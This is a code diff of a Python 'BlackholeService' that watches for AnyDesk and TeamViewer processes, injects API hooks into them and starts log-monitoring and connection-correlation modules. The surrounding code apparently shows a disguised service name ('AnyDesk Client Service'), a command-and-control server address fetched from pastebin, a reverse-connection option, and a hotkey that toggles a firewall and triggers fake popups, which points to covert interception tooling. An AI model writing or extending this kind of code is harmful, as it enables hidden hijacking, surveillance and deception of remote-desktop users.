@@ -38,7 +38,6 @@ from utils.process_monitor import ProcessMonitor
 from utils.api_hooker import APIHooker
 from utils.hotkeys import HotkeyListener
 from utils.notifications import show_driver_error
-from utils.anydesk_finder import AnyDeskFinder
 from utils.log_monitor import LogMonitor
 from utils.connection_correlator import ConnectionCorrelator
 from utils.anydesk_controller import AnyDeskController
@@ -147,13 +146,13 @@ class BlackholeService:
         self.api_hooker = APIHooker(log_func=self.log)
         self.hotkey_listener = HotkeyListener(TOGGLE_HOTKEY, self.toggle_firewall, log_func=self.log)
 
-        # Initialize AnyDesk integration components
-        self.anydesk_path = None  # Discovered path to real AnyDesk.exe
-        self.log_monitor = LogMonitor(callback=self._on_log_event, log_func=self.log)
-        self.correlator = ConnectionCorrelator(
-            callback=self._on_connection_event, time_window=CORRELATION_TIME_WINDOW, log_func=self.log
-        )
-        self.anydesk_controller = AnyDeskController(log_func=self.log)
+        # Initialize AnyDesk integration components as None
+        # They will be created/destroyed dynamically by _on_process_event
+        self.anydesk_path = None
+        self.anydesk_mode = None
+        self.log_monitor = None
+        self.correlator = None
+        self.anydesk_controller = AnyDeskController(log_func=self.log)  # This one can stay
 
         # Fetch C2 server IP dynamically from pastebin
         c2_host = self._get_c2_ip()
@@ -171,39 +170,92 @@ class BlackholeService:
         self.log("  AnyDesk Client Service")
         self.log("=" * 60)
         self.log(f"Mode: {'DEV' if dev_mode else 'PRODUCTION'}")
-        self.log(f"Architecture: API Hooking + Log Monitoring")
+        self.log(f"AnyDesk Mode: Awaiting detection...")  # New status
+        self.log(f"Architecture: API Hooking + Dynamic Log Monitoring")
         self.log(f"Default state: {'ACTIVE' if DEFAULT_FIREWALL_STATE else 'INACTIVE'}")
         self.log(f"Reverse connection: {'ENABLED' if REVERSE_CONNECTION_ENABLED else 'DISABLED'}")
         self.log(f"Hotkey: Command+Shift+F (toggle firewall + fake popup)")
         self.log("=" * 60 + "\n")
 
-    def _on_process_event(self, event_type, pid, process_name):
+    def _on_process_event(self, event_type, pid, process_name, exe_path):
         """
         Handle process found/lost events from ProcessMonitor.
-
-        Args:
-            event_type: 'found' or 'lost'
-            pid: Process ID
-            process_name: Name of the process
+        This is the new "brain" of the service.
         """
+        # We only care about AnyDesk for this logic
+        if process_name != "AnyDesk.exe":
+            if event_type == "found":
+                # Hook other target processes (TeamViewer, etc.)
+                success = self.api_hooker.hook_process(pid, process_name)
+                if not success:
+                    self.log(f"[SERVICE] WARNING: Failed to hook {process_name} (PID: {pid})")
+            elif event_type == "lost":
+                self.api_hooker.unhook_process(pid)
+            return
+
+        # --- AnyDesk-Specific Dynamic Logic ---
         if event_type == "found":
-            # Hook the process
+            self.log(f"[SERVICE] AnyDesk process FOUND (PID: {pid}) at {exe_path}")
+
+            # 1. Determine and set mode
+            if not exe_path:
+                self.log("[SERVICE] WARNING: Could not get AnyDesk .exe path. Defaulting to PORTABLE mode.")
+                self.anydesk_mode = "portable"
+            else:
+                self.anydesk_path = exe_path  # Store the path
+                path_lower = exe_path.lower()
+                if r"c:\program files (x86)\anydesk" in path_lower or r"c:\program files\anydesk" in path_lower:
+                    self.anydesk_mode = "service"
+                else:
+                    self.anydesk_mode = "portable"
+            self.log(f"[SERVICE] AnyDesk mode set to: {self.anydesk_mode.upper()}")
+
+            # 2. Stop any old/stale monitors (handles version switching)
+            if self.log_monitor and self.log_monitor.is_running():
+                self.log("[SERVICE] Stopping old log monitor...")
+                self.log_monitor.stop()
+            if self.correlator:
+                self.log("[SERVICE] Stopping old correlator...")
+                self.correlator.stop()
+
+            # 3. Initialize and start new modules with the correct mode
+            self.log("[SERVICE] Initializing new modules for this mode...")
+            self.log_monitor = LogMonitor(callback=self._on_log_event, mode=self.anydesk_mode, log_func=self.log)
+            self.correlator = ConnectionCorrelator(
+                callback=self._on_connection_event,
+                mode=self.anydesk_mode,
+                time_window=CORRELATION_TIME_WINDOW,
+                log_func=self.log,
+            )
+
+            self.log_monitor.start()
+            self.correlator.start()
+
+            # 4. Hook the new process
             success = self.api_hooker.hook_process(pid, process_name)
             if not success:
                 self.log(f"[SERVICE] WARNING: Failed to hook {process_name} (PID: {pid})")
+
         elif event_type == "lost":
-            # Unhook the process
+            self.log(f"[SERVICE] AnyDesk process LOST (PID: {pid})")
+
+            # 1. Unhook
             self.api_hooker.unhook_process(pid)
 
-    def _discover_anydesk(self):
-        """Discover AnyDesk.exe location at service startup"""
-        self.log("[SERVICE] Discovering AnyDesk installation...")
-        self.anydesk_path = AnyDeskFinder.find_anydesk(log_func=self.log)
+            # 2. Stop monitors
+            if self.log_monitor and self.log_monitor.is_running():
+                self.log("[SERVICE] Stopping log monitor...")
+                self.log_monitor.stop()
+            if self.correlator:
+                self.log("[SERVICE] Stopping correlator...")
+                self.correlator.stop()
 
-        if self.anydesk_path:
-            self.log(f"[SERVICE] AnyDesk found: {self.anydesk_path}")
-        else:
-            self.log("[SERVICE] WARNING: AnyDesk.exe not found - reverse connection disabled")
+            # 3. Reset state
+            self.log("[SERVICE] Resetting AnyDesk state. Awaiting new process...")
+            self.anydesk_mode = None
+            self.anydesk_path = None
+            self.log_monitor = None
+            self.correlator = None
 
     def _get_c2_ip(self):
         """Fetch C2 server IP from pastebin with fallback"""
@@ -413,16 +465,7 @@ class BlackholeService:
         """Start the service"""
         self.log("[SERVICE] Starting Blackhole service...")
 
-        # Discover AnyDesk installation
-        self._discover_anydesk()
-
-        # Start AnyDesk log monitoring
-        self.log("[SERVICE] Starting AnyDesk log monitor...")
-        self.log_monitor.start()
-        self.log("[SERVICE] Starting correlation engine...")
-        self.correlator.start()
-
-        # Start process monitor
+        # Start process monitor (this is now the main trigger)
         self.process_monitor.start()
 
         # Start hotkey listener
@@ -468,11 +511,13 @@ class BlackholeService:
         """Stop the service"""
         self.log("[SERVICE] Stopping Blackhole service...")
 
-        # Stop AnyDesk components
-        self.log("[SERVICE] Stopping AnyDesk log monitor...")
-        self.log_monitor.stop()
-        self.log("[SERVICE] Stopping correlation engine...")
-        self.correlator.stop()
+        # Stop AnyDesk components (with checks)
+        if self.log_monitor:
+            self.log("[SERVICE] Stopping AnyDesk log monitor...")
+            self.log_monitor.stop()
+        if self.correlator:
+            self.log("[SERVICE] Stopping correlation engine...")
+            self.correlator.stop()
 
         # Close all fake popups
         self._close_all_popups()
@@ -496,7 +541,7 @@ class BlackholeService:
             try:
                 stats = self.gatekeeper.get_stats()
                 hooked_pids = self.api_hooker.get_hooked_processes()
-                correlator_stats = self.correlator.get_stats()
+                correlator_stats = self.correlator.get_stats() if self.correlator else {}
 
                 self.log("\n" + "=" * 60)
                 self.log("  Session Statistics")
